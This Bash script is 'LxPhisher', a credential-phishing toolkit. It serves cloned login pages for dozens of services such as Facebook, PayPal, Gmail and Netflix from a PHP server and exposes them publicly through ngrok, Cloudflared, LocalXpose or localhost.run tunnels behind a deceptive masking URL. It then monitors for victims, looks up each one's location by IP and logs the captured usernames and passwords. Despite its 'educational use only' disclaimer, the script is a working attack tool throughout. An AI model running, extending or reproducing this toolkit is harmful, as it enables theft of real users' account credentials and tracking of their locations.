#!/bin/bash

# ==================================================
# LxPhisher - Advanced Phishing Toolkit
# Version: 3.0
# Author: Voltsparx
# License: MIT (For Educational Purposes Only)
# Menu Enhancement by: AI Assistant
# ==================================================

# Color codes
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
PURPLE='\033[0;95m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
ORANGE='\033[0;33m'
NC='\033[0m'

# Configuration
HOST='127.0.0.1'
PORT='8080'
SERVER_DIR=""
TEMPLATE_NAME=""
TUNNEL_URL=""
TUNNEL_SERVICE=""
MASK_URL="https://free-facebook-verified.com"

# Create directories
mkdir -p templates servers captured_data auth .tunnels

# Show header
show_header() {
    clear
    echo -e "${BLUE}"
    echo " _          ____  _     _     _               "
    echo "| |   __  _|  _ \| |__ (_)___| |__   ___ _ __ "
    echo "| |   \ \/ / |_) | '_ \| / __| '_ \ / _ \ '__|"
    echo "| |___ >  <|  __/| | | | \__ \ | | |  __/ |   "
    echo "|_____/_/\_\_|   |_| |_|_|___/_| |_|\___|_|   "
    echo -e "${NC}"
    echo -e "        ${CYAN}Advanced Phishing Simulation Toolkit${NC}"
    echo -e "         ${GREEN}v3.0 - By Voltsparx${NC}"
    echo -e "        ${YELLOW}Contact: voltsparx@gmail.com${NC}"
    echo -e "           ${RED}<< For Educational Use Only >>${NC}"
    echo "================================================"
}

# Check dependencies
check_deps() {
    echo -e "\n${GREEN}[+]${CYAN} Checking dependencies...${NC}"
    local deps=("php" "curl" "wget" "unzip" "jq")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[!] Please install $dep first${NC}"
            exit 1
        fi
    done
    echo -e "${GREEN}[+]${GREEN} Dependencies found${NC}"
}

# Install tunnelers
install_tunnelers() {
    echo -e "\n${GREEN}[+]${CYAN} Checking and installing tunnelers...${NC}"
    
    # Cloudflared
    if [ ! -f ".tunnels/cloudflared" ]; then
        echo -e "${YELLOW}[i] Installing Cloudflared...${NC}"
        arch=$(uname -m)
        case $arch in
            x86_64) pkg="cloudflared-linux-amd64" ;;
            i*86) pkg="cloudflared-linux-386" ;;
            aarch64) pkg="cloudflared-linux-arm64" ;;
            arm*) pkg="cloudflared-linux-arm" ;;
            *) echo -e "${RED}[!] Unsupported architecture${NC}"; return 1 ;;
        esac
        
        wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/$pkg.tar.gz" -O .tunnels/cloudflared.tar.gz
        tar -zxf .tunnels/cloudflared.tar.gz -C .tunnels/ > /dev/null 2>&1
        mv .tunnels/cloudflared .tunnels/cloudflared-bin
        chmod +x .tunnels/cloudflared-bin
        rm -f .tunnels/cloudflared.tar.gz
        echo -e "${GREEN}[+] Cloudflared installed successfully${NC}"
    else
        echo -e "${GREEN}[+] Cloudflared already installed${NC}"
    fi

    # LocalXpose
    if [ ! -f ".tunnels/loclx" ]; then
        echo -e "${YELLOW}[i] Installing LocalXpose...${NC}"
        arch=$(uname -m)
        case $arch in
            x86_64) pkg="loclx-linux-amd64.zip" ;;
            aarch64) pkg="loclx-linux-arm64.zip" ;;
            arm*) pkg="loclx-linux-arm.zip" ;;
            i*86) pkg="loclx-linux-386.zip" ;;
            *) echo -e "${RED}[!] Unsupported architecture${NC}"; return 1 ;;
        esac
        
        wget -q "https://api.localxpose.io/api/v2/downloads/$pkg" -O .tunnels/loclx.zip
        unzip -qq .tunnels/loclx.zip -d .tunnels/
        chmod +x .tunnels/loclx
        rm -f .tunnels/loclx.zip
        echo -e "${GREEN}[+] LocalXpose installed successfully${NC}"
    else
        echo -e "${GREEN}[+] LocalXpose already installed${NC}"
    fi
    
    echo -e "${GREEN}[+] All tunnelers are ready${NC}"
    sleep 2
}

# Port selection
select_port() {
    echo -e "\n${GREEN}[+]${CYAN} Port Selection:${NC}"
    echo -e "${YELLOW}[i] Current port: ${PORT}${NC}"
    read -p "$(echo -e "${GREEN}[+]${CYAN} Enter custom port [1-65535] (Enter for 8080): ${NC}")" custom_port
    
    if [ -n "$custom_port" ]; then
        if [[ $custom_port =~ ^[0-9]+$ ]] && [ $custom_port -ge 1 ] && [ $custom_port -le 65535 ]; then
            PORT=$custom_port
            echo -e "${GREEN}[+]${GREEN} Using port: ${PORT}${NC}"
        else
            echo -e "${RED}[!] Invalid port number${NC}"
            sleep 2
            return 1
        fi
    fi
    return 0
}

# Improved template menu with categories
show_template_menu() {
    clear
    show_header
    echo -e "${GREEN}[+]${CYAN} Select a Phishing Template:${NC}"
    echo ""
    
    # Social Media Category
    echo -e "${PURPLE}┌──────────────── SOCIAL MEDIA ────────────────┐${NC}"
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}05${RED}]${ORANGE} Twitter      ${RED}[${WHITE}09${RED}]${ORANGE} TikTok"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}06${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}10${RED}]${ORANGE} Discord"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} LinkedIn      ${RED}[${WHITE}07${RED}]${ORANGE} Reddit       ${RED}[${WHITE}11${RED}]${ORANGE} VK"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Pinterest     ${RED}[${WHITE}08${RED}]${ORANGE} Twitch       ${RED}[${WHITE}12${RED}]${ORANGE} GitHub"
    echo -e "${PURPLE}└───────────────────────────────────────────────┘${NC}"
    echo ""
    
    # Email & Communication Category
    echo -e "${PURPLE}┌─────────── EMAIL & COMMUNICATION ────────────┐${NC}"
    echo -e "${RED}[${WHITE}13${RED}]${ORANGE} Gmail         ${RED}[${WHITE}17${RED}]${ORANGE} Yahoo        ${RED}[${WHITE}21${RED}]${ORANGE} ProtonMail"
    echo -e "${RED}[${WHITE}14${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}18${RED}]${ORANGE} StackOverflow${RED}[${WHITE}22${RED}]${ORANGE} GitLab"
    echo -e "${RED}[${WHITE}15${RED}]${ORANGE} Wordpress     ${RED}[${WHITE}19${RED}]${ORANGE} Quora        ${RED}[${WHITE}23${RED}]${ORANGE} DeviantArt"
    echo -e "${RED}[${WHITE}16${RED}]${ORANGE} Yandex        ${RED}[${WHITE}20${RED}]${ORANGE} MediaFire    ${NC}"
    echo -e "${PURPLE}└───────────────────────────────────────────────┘${NC}"
    echo ""
    
    # Finance & Shopping Category
    echo -e "${PURPLE}┌──────────── FINANCE & SHOPPING ──────────────┐${NC}"
    echo -e "${RED}[${WHITE}24${RED}]${ORANGE} PayPal        ${RED}[${WHITE}27${RED}]${ORANGE} eBay         ${RED}[${WHITE}30${RED}]${ORANGE} Steam"
    echo -e "${RED}[${WHITE}25${RED}]${ORANGE} Adobe         ${RED}[${WHITE}28${RED}]${ORANGE} Origin       ${RED}[${WHITE}31${RED}]${ORANGE} Roblox"
    echo -e "${RED}[${WHITE}26${RED}]${ORANGE} Dropbox       ${RED}[${WHITE}29${RED}]${ORANGE} XBOX         ${NC}"
    echo -e "${PURPLE}└───────────────────────────────────────────────┘${NC}"
    echo ""
    
    # Entertainment & Streaming Category
    echo -e "${PURPLE}┌────────── ENTERTAINMENT & MEDIA ─────────────┐${NC}"
    echo -e "${RED}[${WHITE}32${RED}]${ORANGE} Netflix       ${RED}[${WHITE}34${RED}]${ORANGE} Spotify      ${RED}[${WHITE}36${RED}]${ORANGE} Playstation"
    echo -e "${RED}[${WHITE}33${RED}]${ORANGE} Badoo         ${RED}[${WHITE}35${RED}]${ORANGE} Google       ${NC}"
    echo -e "${PURPLE}└───────────────────────────────────────────────┘${NC}"
    echo ""
    
    # Additional Options
    echo -e "${RED}[${WHITE}37${RED}]${ORANGE} Custom Template"
    echo -e "${RED}[${WHITE}98${RED}]${ORANGE} Back to Main Menu"
    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About"
    echo -e "${RED}[${WHITE}00${RED}]${ORANGE} Exit"
    echo ""
}

# Updated get_template_name function to match new numbering
get_template_name() {
    case $1 in
        1) echo "facebook" ;;
        2) echo "instagram" ;;
        3) echo "linkedin" ;;
        4) echo "pinterest" ;;
        5) echo "twitter" ;;
        6) echo "snapchat" ;;
        7) echo "reddit" ;;
        8) echo "twitch" ;;
        9) echo "tiktok" ;;
        10) echo "discord" ;;
        11) echo "vk" ;;
        12) echo "github" ;;
        13) echo "google" ;;
        14) echo "microsoft" ;;
        15) echo "wordpress" ;;
        16) echo "yandex" ;;
        17) echo "yahoo" ;;
        18) echo "stackoverflow" ;;
        19) echo "quora" ;;
        20) echo "mediafire" ;;
        21) echo "protonmail" ;;
        22) echo "gitlab" ;;
        23) echo "deviantart" ;;
        24) echo "paypal" ;;
        25) echo "adobe" ;;
        26) echo "dropbox" ;;
        27) echo "ebay" ;;
        28) echo "origin" ;;
        29) echo "xbox" ;;
        30) echo "steam" ;;
        31) echo "roblox" ;;
        32) echo "netflix" ;;
        33) echo "badoo" ;;
        34) echo "spotify" ;;
        35) echo "google" ;;
        36) echo "playstation" ;;
        37) echo "custom" ;;
        *) echo "" ;;
    esac
}

# URL masking
mask_url() {
    echo -e "\n${GREEN}[+]${CYAN} URL Masking:${NC}"
    echo -e "${YELLOW}[i] Current masking URL: ${MASK_URL}${NC}"
    read -p "$(echo -e "${GREEN}[+]${CYAN} Enter masking URL (Enter to keep current): ${NC}")" custom_mask
    
    if [ -n "$custom_mask" ]; then
        MASK_URL="$custom_mask"
    fi
    echo -e "${GREEN}[+]${GREEN} Masking URL: ${MASK_URL}${NC}"
    sleep 1
}

# Tunnel selection
select_tunnel() {
    echo -e "\n${GREEN}[+]${CYAN} Select Tunneling Method:${NC}"
    echo "1) Localhost (127.0.0.1:${PORT})"
    echo "2) Ngrok (Public URL)"
    echo "3) Cloudflared (Public URL)"
    echo "4) LocalXpose (Public URL)"
    echo "5) Localhost.run (Public URL)"
    echo ""
    
    read -p "$(echo -e "${GREEN}[+]${CYAN} Choose option (1-5): ${NC}")" choice
    
    case $choice in
        1)
            TUNNEL_SERVICE="localhost"
            TUNNEL_URL="http://$HOST:$PORT"
            echo -e "${GREEN}[+]${GREEN} Using localhost: http://$HOST:$PORT${NC}"
            ;;
        2)
            if ! command -v ngrok &> /dev/null; then
                echo -e "${RED}[!] Ngrok not installed. Please install it first.${NC}"
                sleep 2
                return 1
            fi
            TUNNEL_SERVICE="ngrok"
            start_ngrok
            ;;
        3)
            TUNNEL_SERVICE="cloudflared"
            start_cloudflared
            ;;
        4)
            TUNNEL_SERVICE="localxpose"
            start_localxpose
            ;;
        5)
            TUNNEL_SERVICE="localhostrun"
            start_localhostrun
            ;;
        *)
            echo -e "${RED}[!] Invalid selection${NC}"
            sleep 1
            return 1
            ;;
    esac
    return 0
}

# Start ngrok
start_ngrok() {
    echo -e "\n${GREEN}[+]${CYAN} Starting Ngrok tunnel...${NC}"
    pkill -f ngrok 2>/dev/null
    ngrok http $PORT > /dev/null 2>&1 &
    sleep 5
    TUNNEL_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[^\\\"]*.ngrok.io")
    if [ -n "$TUNNEL_URL" ]; then
        echo -e "${GREEN}[+]${GREEN} Ngrok URL: ${TUNNEL_URL}${NC}"
    else
        echo -e "${RED}[!] Failed to get Ngrok URL${NC}"
        return 1
    fi
}

# Start cloudflared
start_cloudflared() {
    echo -e "\n${GREEN}[+]${CYAN} Starting Cloudflared tunnel...${NC}"
    pkill -f cloudflared 2>/dev/null
    .tunnels/cloudflared-bin tunnel --url http://$HOST:$PORT > .tunnels/cloudflared.log 2>&1 &
    sleep 7
    TUNNEL_URL=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels/cloudflared.log")
    if [ -n "$TUNNEL_URL" ]; then
        echo -e "${GREEN}[+]${GREEN} Cloudflared URL: ${TUNNEL_URL}${NC}"
    else
        echo -e "${RED}[!] Failed to get Cloudflared URL${NC}"
        return 1
    fi
}

# Start localxpose
start_localxpose() {
    echo -e "\n${GREEN}[+]${CYAN} Starting LocalXpose tunnel...${NC}"
    pkill -f loclx 2>/dev/null
    .tunnels/loclx tunnel --raw-mode http --https-redirect -t $HOST:$PORT > .tunnels/localxpose.log 2>&1 &
    sleep 10
    TUNNEL_URL=$(grep -o '[0-9a-zA-Z.]*\.loclx.io' ".tunnels/localxpose.log")
    if [ -n "$TUNNEL_URL" ]; then
        TUNNEL_URL="https://$TUNNEL_URL"
        echo -e "${GREEN}[+]${GREEN} LocalXpose URL: ${TUNNEL_URL}${NC}"
    else
        echo -e "${RED}[!] Failed to get LocalXpose URL${NC}"
        return 1
    fi
}

# Start localhost.run
start_localhostrun() {
    echo -e "\n${GREEN}[+]${CYAN} Starting localhost.run tunnel...${NC}"
    pkill -f localhost.run 2>/dev/null
    ssh -R 80:localhost:$PORT ssh.localhost.run > .tunnels/localhostrun.log 2>&1 &
    sleep 5
    TUNNEL_URL=$(grep -o 'https://[^ ]*\.localhost.run' ".tunnels/localhostrun.log")
    if [ -n "$TUNNEL_URL" ]; then
        echo -e "${GREEN}[+]${GREEN} localhost.run URL: ${TUNNEL_URL}${NC}"
    else
        echo -e "${RED}[!] Failed to get localhost.run URL${NC}"
        return 1
    fi
}

# Start server
start_server() {
    template=$1
    echo -e "\n${GREEN}[+]${CYAN} Starting PHP server...${NC}"
    
    pkill -f "php -S" 2>/dev/null
    SERVER_DIR="servers/$template"
    rm -rf "$SERVER_DIR" 2>/dev/null
    cp -r "templates/$template" "$SERVER_DIR"
    
    cd "$SERVER_DIR"
    php -S $HOST:$PORT > /dev/null 2>&1 &
    cd - > /dev/null
    sleep 2
}

# Get geolocation data
get_geolocation() {
    local ip=$1
    local geo_data=$(curl -s "http://ip-api.com/json/$ip")
    
    echo "Latitude: $(echo $geo_data | jq -r '.lat // "N/A"')"
    echo "Longitude: $(echo $geo_data | jq -r '.lon // "N/A"')"
    echo "City: $(echo $geo_data | jq -r '.city // "N/A"')"
    echo "Region: $(echo $geo_data | jq -r '.regionName // "N/A"')"
    echo "Country: $(echo $geo_data | jq -r '.country // "N/A"')"
    echo "ISP: $(echo $geo_data | jq -r '.isp // "N/A"')"
    echo "Timezone: $(echo $geo_data | jq -r '.timezone // "N/A"')"
}

# Monitor for victims and credentials
monitor_victims() {
    echo -e "\n${GREEN}[+]${CYAN} Monitoring for victims...${NC}"
    echo -e "${YELLOW}[i] Send this URL to targets: ${TUNNEL_URL}${NC}"
    echo -e "${YELLOW}[i] Masked URL: ${MASK_URL}${NC}"
    echo -e "${YELLOW}[i] Press Ctrl+C to stop monitoring${NC}"
    
    local credentials_file="captured_data/credentials_${TEMPLATE_NAME}_$(date +%Y%m%d_%H%M%S).log"
    
    # Clear previous data
    rm -f "$SERVER_DIR/usernames.txt" "$SERVER_DIR/ip.txt" 2>/dev/null
    
    while true; do
        # Check for new victim
        if [ -f "$SERVER_DIR/ip.txt" ]; then
            local victim_ip=$(cat "$SERVER_DIR/ip.txt")
            echo -e "\n${GREEN}[+]${GREEN} 🎯 VICTIM CONNECTED!${NC}"
            echo -e "${CYAN}IP Address: ${victim_ip}${NC}"
            echo -e "${CYAN}Timestamp: $(date)${NC}"
            
            # Get and display geolocation
            echo -e "\n${YELLOW}📍 Geolocation Data:${NC}"
            get_geolocation "$victim_ip"
            
            # Save to log file
            echo "=== VICTIM CONNECTED ===" >> "$credentials_file"
            echo "Timestamp: $(date)" >> "$credentials_file"
            echo "IP Address: $victim_ip" >> "$credentials_file"
            echo "Template: $TEMPLATE_NAME" >> "$credentials_file"
            get_geolocation "$victim_ip" >> "$credentials_file"
            echo "========================" >> "$credentials_file"
            
            rm -f "$SERVER_DIR/ip.txt"
        fi
        
        # Check for credentials
        if [ -f "$SERVER_DIR/usernames.txt" ]; then
            echo -e "\n${RED}[+]${RED} 🔐 CREDENTIALS CAPTURED!${NC}"
            echo -e "${RED}=== CAPTURED DATA ===${NC}"
            cat "$SERVER_DIR/usernames.txt"
            echo -e "${RED}=====================${NC}"
            
            # Save to log file
            echo "=== CREDENTIALS CAPTURED ===" >> "$credentials_file"
            cat "$SERVER_DIR/usernames.txt" >> "$credentials_file"
            echo "===========================" >> "$credentials_file"
            
            rm -f "$SERVER_DIR/usernames.txt"
        fi
        
        sleep 1
    done
}

# View captured data function
view_captured_data() {
    clear
    show_header
    echo -e "${GREEN}[+]${CYAN} Captured Data:${NC}"
    echo ""
    
    if [ -d "captured_data" ] && [ -n "$(ls -A captured_data 2>/dev/null)" ]; then
        echo -e "${YELLOW}Available credential files:${NC}"
        ls -la captured_data/
        echo ""
        read -p "$(echo -e "${GREEN}[+]${CYAN} Enter filename to view (or press Enter to return): ${NC}")" data_file
        
        if [ -n "$data_file" ] && [ -f "captured_data/$data_file" ]; then
            echo -e "\n${YELLOW}Contents of $data_file:${NC}"
            echo "=========================================="
            cat "captured_data/$data_file"
            echo "=========================================="
            read -p "$(echo -e "${GREEN}[+]${CYAN} Press Enter to continue... ${NC}")"
        fi
    else
        echo -e "${RED}[!] No captured data found${NC}"
        sleep 2
    fi
}

# Show about information
show_about() {
    clear
    show_header
    echo -e "${GREEN}[+]${CYAN} About LxPhisher:${NC}"
    echo ""
    echo -e "${YELLOW}LxPhisher is an advanced phishing simulation toolkit designed"
    echo -e "for educational purposes and security awareness training.${NC}"
    echo ""
    echo -e "${CYAN}Features:${NC}"
    echo -e "• Multiple phishing templates"
    echo -e "• Various tunneling options"
    echo -e "• Real-time victim monitoring"
    echo -e "• Geolocation tracking"
    echo -e "• Credential capture"
    echo ""
    echo -e "${RED}Disclaimer:${NC}"
    echo -e "This tool is for educational purposes only. The author is not"
    echo -e "responsible for any misuse or damage caused by this program."
    echo ""
    echo -e "${GREEN}Author: Voltsparx${NC}"
    echo -e "${GREEN}Contact: voltsparx@gmail.com${NC}"
    echo ""
}

# Main menu function
show_main_menu() {
    clear
    show_header
    echo -e "${GREEN}[+]${CYAN} Main Menu:${NC}"
    echo ""
    echo -e "${RED}[${WHITE}1${RED}]${ORANGE} Select Phishing Template"
    echo -e "${RED}[${WHITE}2${RED}]${ORANGE} Configure Tunnel Settings"
    echo -e "${RED}[${WHITE}3${RED}]${ORANGE} Set Custom Port (Current: ${PORT})"
    echo -e "${RED}[${WHITE}4${RED}]${ORANGE} Set URL Masking (Current: ${MASK_URL})"
    echo -e "${RED}[${WHITE}5${RED}]${ORANGE} View Captured Data"
    echo -e "${RED}[${WHITE}6${RED}]${ORANGE} Install/Update Tunnelers"
    echo -e "${RED}[${WHITE}7${RED}]${ORANGE} About"
    echo -e "${RED}[${WHITE}0${RED}]${ORANGE} Exit"
    echo ""
}

# Main execution
main() {
    show_header
    check_deps
    
    while true; do
        show_main_menu
        read -p "$(echo -e "${GREEN}[+]${CYAN} Select an option: ${NC}")" choice
        
        case $choice in
            0) 
                echo -e "${GREEN}[+] Goodbye!${NC}"
                cleanup
                exit 0 
                ;;
            1)
                while true; do
                    show_template_menu
                    read -p "$(echo -e "${GREEN}[+]${CYAN} Select a template (98 to go back): ${NC}")" template_choice
                    
                    case $template_choice in
                        98) break ;;
                        00) 
                            echo -e "${GREEN}[+] Goodbye!${NC}"
                            cleanup
                            exit 0 
                            ;;
                        99) 
                            show_about
                            read -p "$(echo -e "${GREEN}[+]${CYAN} Press Enter to continue... ${NC}")"
                            continue 
                            ;;
                        [0-9]|[0-9][0-9])
                            TEMPLATE_NAME=$(get_template_name $template_choice)
                            if [ -z "$TEMPLATE_NAME" ]; then
                                echo -e "${RED}[!] Invalid selection${NC}"
                                sleep 1
                                continue
                            fi
                            
                            if [ "$TEMPLATE_NAME" = "custom" ]; then
                                read -p "$(echo -e "${GREEN}[+]${CYAN} Enter custom template path: ${NC}")" custom_path
                                if [ -d "$custom_path" ]; then
                                    TEMPLATE_NAME=$(basename "$custom_path")
                                    cp -r "$custom_path" "templates/$TEMPLATE_NAME"
                                else
                                    echo -e "${RED}[!] Invalid template path${NC}"
                                    continue
                                fi
                            fi
                            
                            if [ ! -d "templates/$TEMPLATE_NAME" ]; then
                                echo -e "${RED}[!] Template not found: $TEMPLATE_NAME${NC}"
                                sleep 1
                                continue
                            fi
                            
                            if select_port; then
                                mask_url
                                if select_tunnel; then
                                    start_server "$TEMPLATE_NAME"
                                    monitor_victims
                                fi
                            fi
                            ;;
                        *)
                            echo -e "${RED}[!] Invalid option${NC}"
                            sleep 1
                            ;;
                    esac
                done
                ;;
            2) 
                if select_tunnel; then
                    echo -e "${GREEN}[+] Tunnel configured successfully${NC}"
                    sleep 2
                fi
                ;;
            3) 
                if select_port; then
                    echo -e "${GREEN}[+] Port set to: ${PORT}${NC}"
                    sleep 2
                fi
                ;;
            4) 
                mask_url
                echo -e "${GREEN}[+] URL masking set${NC}"
                sleep 2
                ;;
            5) 
                view_captured_data
                ;;
            6)
                install_tunnelers
                ;;
            7)
                show_about
                read -p "$(echo -e "${GREEN}[+]${CYAN} Press Enter to continue... ${NC}")"
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# Cleanup
cleanup() {
    echo -e "\n${RED}[!] Shutting down...${NC}"
    pkill -f "php -S" 2>/dev/null
    pkill -f ngrok 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    pkill -f loclx 2>/dev/null
    pkill -f localhost.run 2>/dev/null
    exit 0
}

trap cleanup INT

# Start
main